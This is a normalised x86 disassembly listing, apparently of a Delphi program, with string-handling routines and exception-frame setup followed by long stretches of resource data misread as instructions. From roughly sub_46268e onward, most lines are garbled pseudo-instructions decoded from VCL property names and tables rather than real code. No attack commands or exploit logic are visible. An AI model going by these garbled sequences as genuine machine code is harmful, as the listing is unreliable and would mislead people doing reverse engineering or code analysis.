mov [ eax + 0x64 ] edx
pop ecx
pop edx
pop edi
pop esi
retn
sub_462234
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4305a0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4305a0
cmp ebp [ eax ]
jne r-xdata
sub_4622a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x48 ]
call sub_44cd1c
mov edx 0xff000007
mov eax [ edi + 0x40 ]
call sub_44c1c8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x48 ]
call sub_44cd1c
mov edx 0xff00000e
mov eax [ edi + 0x40 ]
call sub_44c1c8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40587c
mov edx [ r-xdata ]
call sub_40580c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x48 ]
call sub_44cd1c
mov edx 0xff000011
mov eax [ edi + 0x40 ]
call sub_44c1c8
jmp r-xdata
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_46238c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4070a8
mov ebp 0x1
jmp r-xdata
mov eax [ esi ]
call sub_407400
cmp ebp eax
jle r-xdata
mov eax [ esi ]
movzx edi [ eax + ebp * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
cmp di 0xdfff
jbe r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax [ esi ]
cmp [ eax + ebp * 2 - 0x2 ] 0x26
jne r-xdata
inc ebp
jmp r-xdata
inc ebp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov [ esp + 0xb ] 0x0
cmp ebp 0x1
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx ebp
call sub_4078a0
mov edx ebp
dec edx
mov eax esi
mov ecx 0x4
call sub_4078a0
jmp r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov [ esp + 0x9 ] 0x0
mov eax [ esi ]
cmp [ eax + ebp * 2 - 0x4 ] 0x28
sete [ esp + 0x9 ]
jmp r-xdata
mov eax [ esp + 0x4 ]
sub eax ebp
cmp eax 0x2
setge [ esp + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x4 ]
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x4 ] eax
mov [ esp + 0xa ] 0x0
mov eax [ esi ]
cmp [ eax + ebp * 2 + 0x2 ] 0x29
sete [ esp + 0xa ]
jmp r-xdata
cmp [ esp + 0x9 ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
cmp [ esp + 0xb ] 0x0
je r-xdata
movzx eax [ esp + 0xa ]
mov [ esp + 0xb ] al
jmp r-xdata
sub_4624a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4625d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_4070a8
mov ebx 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ ebp - 0xc ] eax
cmp ebx [ ebp - 0xc ]
jg r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4625da
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
cmp [ edi + ebx * 2 - 0x2 ] 0x26
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0xc ]
sub eax ebx
dec eax
jl r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edi eax
inc ebx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + ebx * 2 - 0x2 ] 0x26
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
call sub_407214
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov [ ebp - 0x10 ] eax
sub_4625e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462653
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46238c
mov ebx [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46238c
mov esi [ ebp - 0x8 ]
mov [ ebp - 0xc ] esi
mov edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0x10 ]
call sub_411254
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46265a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_46268e
dec edx
add ah ah
fimul [ edx ]
add al [ eax ]
add [ eax ] al
test al 0xd9
dec edx
add [ edx + 0x4a ] bl
add [ edx ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x210fffb6 ] ah
dec edx
add [ edx ] al
add [ eax ] al
add [ eax - 0x57ffb527 ] ah
loopne r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x1ffbffb6 ] bl
dec edx
add [ edx ] al
add [ eax ] al
add [ eax - 0xbffb527 ] bl
loop r-xdata
cli
jmp [ ecx + rw-data ]
add [ edx ] al
add [ eax ] al
add [ ecx + ebx * 8 + 0x4a ] bh
add ah al
fisttp [ edx ]
add al [ eax ]
add [ eax ] al
js r-xdata
add [ edx ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x1d0fffb6 ] dl
dec edx
add [ edx ] al
add [ eax ] al
add [ eax - 0x4bffb527 ] dl
fisttp [ edx ]
add al [ eax ]
add [ eax ] al
mov ecx ds
dec edx
add [ eax + 0x2004ae2 ] ch
add [ eax ] al
add [ eax + 0x68004ad9 ] cl
loop r-xdata
add [ ecx + ebx * 8 - 0x1cc3ffb6 ] al
dec edx
add [ edx ] al
add [ eax ] al
dec edx
add al bl
fisttp [ edx ]
add al [ eax ]
add [ eax ] al
je r-xdata
inc esi
add [ edi + edi * 8 + 0x30 ] ah
add [ edx ] al
add [ eax + 0x18004ad9 ] al
jecxz r-xdata
dec edx
add [ eax ] ah
loopne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
call sub_4055f0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_407e40
add [ ecx + 0x12 ] bh
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ edx ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub_4627d4
add [ edi ] eax
push esp
inc ebx
jne r-xdata
jae r-xdata
jae r-xdata
add al [ eax ]
enter 0x4628 0x0
jne r-xdata
jae r-xdata
jb r-xdata
outsd
push eax
popad
outsb
push ebx
jb r-xdata
inc esi
insb
popad
jae r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
add al [ eax ]
in al dx
daa
inc esi
add [ ebx ] al
pop ss
push esp
dec ecx
outsb
je r-xdata
jae r-xdata
jb r-xdata
imul ebp [ esi + 0x67 ] 0x6946656c
outsb
jb r-xdata
imul esp [ edi + 0x6f ] 0x536e6150
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jae r-xdata
daa
inc esi
add [ edx ] al
add [ ebp + 0x28640040 ] cl
inc esi
add [ ebx ] al
adc edx [ ecx + ecx * 2 + 0x6e ]
je r-xdata
call 0x2466e83
jb r-xdata
add [ eax ] al
add cl [ ebx ]
dec eax
imul ebp [ esi + 0x74 ] 0x746e6f43
jb r-xdata
jne r-xdata
outsb
je r-xdata
imul esp [ ebx + 0x61 ] 0x67690d6c
outsd
push eax
popad
outsb
dec ecx
outsb
jb r-xdata
outsd
jne r-xdata
popad
jb r-xdata
add eax ebp
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jae r-xdata
arpl [ gs : edx + eax ] si
sub [ eax + 0x280040 ] 0x0
insb
dec edi
jo r-xdata
push edi
outsd
insb
inc ebx
shr [ ecx ] 0x1
inc esi
add [ ebx ] dl
adc [ eax + ecx * 2 + 0x69 ] dl
outsb
je r-xdata
imul esp [ ecx + 0xc ] 0x506f6769
popad
outsb
inc edi
jne r-xdata
jae r-xdata
jb r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jae r-xdata
inc edi
jne r-xdata
push es
outsd
jb r-xdata
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x28e80173
inc esi
add [ edx ] al
add [ eax + r-xdata ] dl
adc edx [ eax ]
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
add [ eax ] al
add cl [ 0x68736552 ]
outsd
ja r-xdata
add al [ eax ]
sub [ eax + 0x80040 ] 0x0
popad
jae r-xdata
aam 0xa3
inc esi
add [ edx ] al
outsb
je r-xdata
imul ebp [ esi + 0x64 ] 0x6c43776f
je r-xdata
sub [ esi ] al
add al [ eax ]
lea eax [ eax ]
in al dx
sub [ esi ] al
add ebx [ ecx ]
push esp
dec ecx
outsb
pushad
je r-xdata
inc esi
add [ ebx ] al
sbb [ ecx + ecx * 2 + 0x6e ] edx
jne r-xdata
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ch
daa
inc esi
add [ edi ] al
inc dx
imul ebp [ gs : bp + 0x9 ] 0x6e496667
jb r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
or [ eax + 0x69 ] cl
outsb
je r-xdata
outsd
jae r-xdata
je r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx + ebp ] al
inc esi
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
outsb
add [ eax ] eax
add [ eax ] al
imul ebp [ ebp + 0x65 ] 0x274756f
add [ eax + edx + 0x340040 ] bl
add [ eax ] al
add cl [ ebx ]
dec eax
imul esp [ ebp + 0x54 ] 0x6f656d69
jne r-xdata
test al 0x40
add [ eax ] bl
add [ eax ] al
add [ edx ] al
or al [ ebx + 0x75 ]
jb r-xdata
add ah cl
add al [ eax ]
int3
popad
jae r-xdata
insb
jne r-xdata
imul ebp [ esi + 0x64 ] 0x6c43776f
add [ eax ] al
add cl [ eax + ecx * 2 ]
imul ebp [ esi + 0x74 ] 0x5778614d
adc [ eax ] al
in al dx
lodsb [ esi ]
inc esi
add [ edx ] al
add ah ch
add al dl
sub [ esi ] eax
adc edx [ eax ]
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
jb r-xdata
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
pushad
sub [ esi ] al
push es
imul esp [ edi + 0x5a ] 0x56d6f6f
imul esp [ edi + 0x50 ] 0x69086e61
push edx
outsd
je r-xdata
push edx
imul esp [ ecx + 0x5 ] 0x6e456667
or [ fs : ebx + 0x6f ] al
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ esp + ebx * 8 + 0x46 ] dl
add [ eax - 0x4bffb923 ] bh
fld [ esi ]
outsd
insd
push 0x6c610874
popad
adc [ eax ] al
add [ eax + edx + 0x300040 ] bl
xor [ eax ] al
popad
js r-xdata
je r-xdata
outsd
inc ebx
jne r-xdata
or [ ecx + 0x6c ] ah
add [ esi ] al
add al [ eax ]
inc eax
adc al [ eax ]
cmp [ eax ] al
add [ eax ] al
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ edx ] al
add [ ebx + 0x462b08c0 ] cl
outsd
add al [ eax ]
add al [ eax ]
mov eax eax
or [ ebx ] ch
inc esi
popad
jae r-xdata
add [ edx ] al
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x2736f50
add [ eax + edx + 0x100040 ] bl
add [ eax + 0x80040a8 ] al
add [ eax ] al
outsb
outsw
or [ ebx + 0x6f ] al
outsb
imul esp [ edi + 0x6f ] 0x65726150
outsb
jb r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jae r-xdata
je r-xdata
inc esi
imul ebp [ esi + 0x67 ] 0x61547265
outsd
insb
jae r-xdata
test ah bl
inc esi
add ah bh
fild [ esi ]
je r-xdata
inc esi
inc esp
jb r-xdata
push ebx
push 0x7244776f
popad
dec ecx
insd
popad
jae r-xdata
nop
imul esp [ esp + esi * 2 + 0x68 ] 0x67580002
inc esp
add [ eax + eax ] dl
add [ eax ] al
add cl [ ecx ]
dec eax
imul ebp [ esi + 0x74 ] 0x6f6c6f43
jb r-xdata
add [ edx ] al
or [ ebx + 0x75 ] eax
jb r-xdata
test al 0x40
add [ eax ] ch
add [ eax ] al
add [ eax + 0x280040a8 ] al
add al [ edi ]
dec eax
imul ebp [ esi + 0x74 ] 0x2727453
add ah ah
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add cl [ eax ]
dec eax
imul ebp [ esi + 0x74 ] 0x61746144
je r-xdata
jb r-xdata
outsd
insb
jae r-xdata
insb
popad
jae r-xdata
popad
jae r-xdata
jne r-xdata
dec edi
push cs
imul esp [ edi + 0x54 ] 0x69466f77
outsb
jb r-xdata
or [ ebx + 0x6f ] al
imul esp [ edi + 0x50 ] 0x73736572
inc ecx
outsb
push esp
popad
jo r-xdata
inc eax
add [ eax + ebp ] bh
inc esi
add [ esi ] al
sbb [ ecx + ecx * 2 + 0x6e ] dl
je r-xdata
add [ ebp + 0x283c0040 ] cl
add [ eax ] al
adc eax 0x776c4146
popad
jns r-xdata
inc esi
add [ esp + ebx * 8 - 0x2403ffba ] al
inc esi
add [ esp + ebx * 8 + 0x46 ] bl
add al dl
fld [ esi ]
aam 0xdd
inc esi
add ah bl
fld [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
add [ eax ] al
adc [ eax ] al
add al 0x0
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] 0x636e6143
insb
push esp
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ 0xb000000 ] al
inc esi
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
insb
imul ebp [ esi + 0x67 ] 0xdc000002
scasb [ edi ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebx ] cl
inc esi
inc esp
jb r-xdata
add [ eax ] al
mov [ ecx ] gs
inc esi
add [ esi ] al
sbb dl [ ecx + ecx * 2 + 0x6e ]
add [ eax + r-xdata ] dl
push es
sub [ esi ] eax
push cs
in al dx
je r-xdata
jo r-xdata
dec edi
outsd
imul ebp [ edi + 0x6e ] 0x1
add [ eax + eax ] al
add [ eax ] al
call 0x1c466f3d
imul esp [ edi + 0x6f ] 0x536e6150
imul ebp [ esi + 0x67 ] 0x6946656c
outsb
jb r-xdata
je r-xdata
jo r-xdata
popad
sbb ch [ ecx + 0x67 ]
outsd
insb
jae r-xdata
outsb
je r-xdata
inc ebx
outsd
push esp
jb r-xdata
pop esp
fadd [ esi ]
rcr ch 0x1
inc esi
add ah dl
fld [ esi ]
fcomp st5
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] al
outsd
insb
jae r-xdata
add [ edi ] al
add [ eax ] al
add [ edx ] ah
sub eax r-xdata
add al 0x0
pop eax
sub eax r-xdata
add eax 0x462d8a00
add [ edx ] cl
push es
add al [ eax ]
add [ eax ] al
pop es
je r-xdata
add [ eax ] al
js r-xdata
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + 0xc0040a8 ] al
add [ eax ] al
add [ eax ] cl
inc esi
inc esp
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add [ eax ] al
fadd [ esi + eax * 2 ]
add [ edx ] al
or ecx [ eax + 0x69 ]
jb r-xdata
jb r-xdata
je r-xdata
push 0x6e6f4308
je r-xdata
outsd
jb r-xdata
jae r-xdata
jb r-xdata
push es
adc al 0x54
dec ecx
outsb
je r-xdata
sub [ esi ] al
add al cl
jb r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
mov eax 0x462b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp + 0x46 ] dh
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
add [ edx ] dl
inc esi
push edx
outsd
jae r-xdata
popad
inc eax
add [ eax ] ch
add [ eax ] al
add [ esi + eax * 2 ] cl
dec ebp
outsd
jne r-xdata
add al [ eax ]
add [ eax + 0x11 ] bh
inc eax
add [ eax ] dh
add [ eax ] al
add [ esi + eax * 2 ] cl
dec ebp
outsd
jne r-xdata
push eax
outsd
jae r-xdata
inc eax
outsd
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jne r-xdata
popad
jpe r-xdata
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc esi
add [ esi ] cl
push 0x67756f72
inc esi
add al bl
sub al 0xde
add ah bl
sub eax [ esi ]
fisubr [ esi + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ esi ] dl
sub eax r-xdata
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esi + ebx * 8 ] bh
inc esi
add [ esi + ebx * 8 ] ch
inc esi
add [ eax ] dl
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] cl
inc esi
inc esp
jb r-xdata
add [ eax ] al
inc esi
add [ esi ] al
inc esp
insb
cmp eax 0x4a00462e
add dl bh
dec [ ebx ]
push esp
inc esp
jb r-xdata
inc esp
insb
je r-xdata
in al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] al
or eax [ esi + 0x44 ]
jb r-xdata
add [ eax ] al
jae r-xdata
outsb
je r-xdata
add [ edi + 0x4a00462d ] dh
add [ edi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x2e ] dh
imul esp [ edi + 0x6e ] 0x3
add [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
inc ecx
jae r-xdata
popad
imul esp [ edi + 0x68 ] 0x696c4374
arpl [ ebx + 0x43 ] bp
popad
outsb
arpl [ ebp + 0x6c ] sp
pop ecx
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add [ eax + 0x40 ] al
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esi + esi ] si
cld
fild [ esi ]
push es
inc esi
add [ edx ] cl
stc
dec edx
add [ eax ] cl
add [ esi + ebp ] cl
pop eax
je r-xdata
insb
push esp
popad
jb r-xdata
je r-xdata
insb
add bh bl
sub eax r-xdata
or [ eax ] al
or al 0x2e
inc esi
add [ edx ] cl
pop es
add al [ fs : eax ]
add [ eax + 0x11 ] bh
insb
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
sub al 0xde
inc esi
add [ ecx ] dl
inc edx
outsw
jb r-xdata
popad
outsb
adc al [ eax ]
or [ eax ] al
add al [ eax ]
jo r-xdata
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x2e ] dh
inc esi
add [ ecx ] al
add [ esi ] al
push ebx
outsd
jne r-xdata
or [ eax ] al
add [ eax ] eax
jo r-xdata
dec ecx
insd
popad
add eax [ gs : bx + si ]
cmp [ eax ] al
add [ eax ] al
adc al [ esi + 0x52 ]
je r-xdata
das
inc esi
add [ edx ] al
add [ edx ] al
jpo r-xdata
inc esp
jae r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
cmp al 0xde
inc esi
add [ ecx ] dl
inc ecx
je r-xdata
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jo r-xdata
adc al [ eax ]
add [ eax ] eax
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
sub eax 0x46ddd000
add [ 0x65646948 ] cl
inc esp
jb r-xdata
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
inc eax
inc eax
arpl [ ebp + 0x3 ] sp
add al bh
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
jo r-xdata
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ edx ] dh
add [ esp + ebx * 8 + 0x46 ] bl
add [ edi ] al
inc edi
je r-xdata
add [ eax + 0x2e ] dh
inc esi
insb
add al [ eax ]
add al [ eax ]
sub eax 0x46dddc00
add [ 0x776f6853 ] cl
inc esp
jb r-xdata
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
sub [ eax + 0x180040 ] 0x0
add [ esi ] cl
add [ eax ] al
add bh bh
add al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ edx ] al
add [ edx ] al
mov al [ 0x200462f ]
add [ edx ] al
enter 0x462f 0x0
add al [ eax ]
add cl al
das
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 4 + 0x2b ] si
inc esi
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
jb r-xdata
dec ecx
insd
popad
add eax [ gs : bx + si ]
add [ eax ] al
add [ eax ] al
add al [ eax ]
add al [ eax ]
sub [ eax ] al
aam 0xdd
inc esi
add [ eax ] cl
dec ecx
outsb
jae r-xdata
insb
popad
insd
add eax [ gs : eax ]
inc eax
inc esi
add [ edx ] al
add [ edx ] al
0x200462f 0x200
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jo r-xdata
outsd
ja r-xdata
outsd
insb
jae r-xdata
add [ ecx ] al
outsd
outsb
jae r-xdata
je r-xdata
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
je r-xdata
add [ eax + 0x440affff ] al
jb r-xdata
jb r-xdata
add [ edx ] cl
add [ edx ] al
loopne r-xdata
comiss xmm0 [ esi ]
add al [ eax ]
add dh [ edi + ebp ]
inc esi
add [ edx ] al
add [ edx ] al
pop ecx
inc esi
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x440dffff ] al
jb r-xdata
dec eax
popad
outsb
insb
sub [ gs : eax + 0xc0040 ] 0x0
dec [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
insd
popad
jae r-xdata
add ch dl
das
inc esi
add [ edx ] al
add [ edx ] al
adc [ eax ] dh
inc esi
add [ edx ] al
add [ edx ] al
xor [ ss : esi ] al
add al [ eax ]
add al [ eax ]
add [ eax ] dl
inc eax
add [ eax + eax ] al
inc esi
add [ edx ] al
add [ edx ] al
add [ eax ] al
or al [ eax ]
add ah al
inc esi
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0bffff ] al
outsd
push esp
popad
jb r-xdata
adc [ eax ] al
add eax 0x5ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430affff ] al
popad
outsb
arpl [ ebp + 0x6c ] sp
insb
imul ebp [ esi + 0x67 ] r-xdata
or [ eax ] al
add bh bh
or [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax + 0x2e ] dh
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
inc esi
add [ esi + ebx * 8 ] ch
inc esi
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add al ah
fiadd [ esi ]
mov eax 0xb40046dd
fld [ esi ]
test ah bl
inc esi
add [ eax + 0x5c0046de ] cl
fadd [ esi ]
rcr ch 0x1
inc esi
add ah dl
fld [ esi ]
fcomp st5
inc esi
add [ esi + ebx * 8 - 0x21b3ffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
fadd [ esi + eax * 2 + 0x4000 ]
add [ eax ] cl
inc esi
inc ebx
outsd
outsb
je r-xdata
inc esp
insb
je r-xdata
jne r-xdata
or ecx [ ebp + 0x6f ]
je r-xdata
outsb
add eax [ eax ]
add [ eax ] al
outsd
insb
add al [ eax ]
add [ eax ] al
add al [ eax ]
das
xor [ esi ] eax
dec esp
add [ edx ] cl
add [ edi + 0x31 ] ah
inc esi
add [ edx ] cl
add al 0x0
push ss
push esp
inc edx
popad
jae r-xdata
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esi + ebx * 8 ] bh
pop ecx
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ ebp + 0x31a40040 ] cl
inc esi
add [ edi ] al
add [ ebx + edx * 2 ] al
inc esp
jb r-xdata
adc [ eax ] al
and [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
insb
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
or al 0x33
inc esi
add [ edi ] al
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
inc ebx
outsd
outsb
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ edx + esi + 0x46 ] al
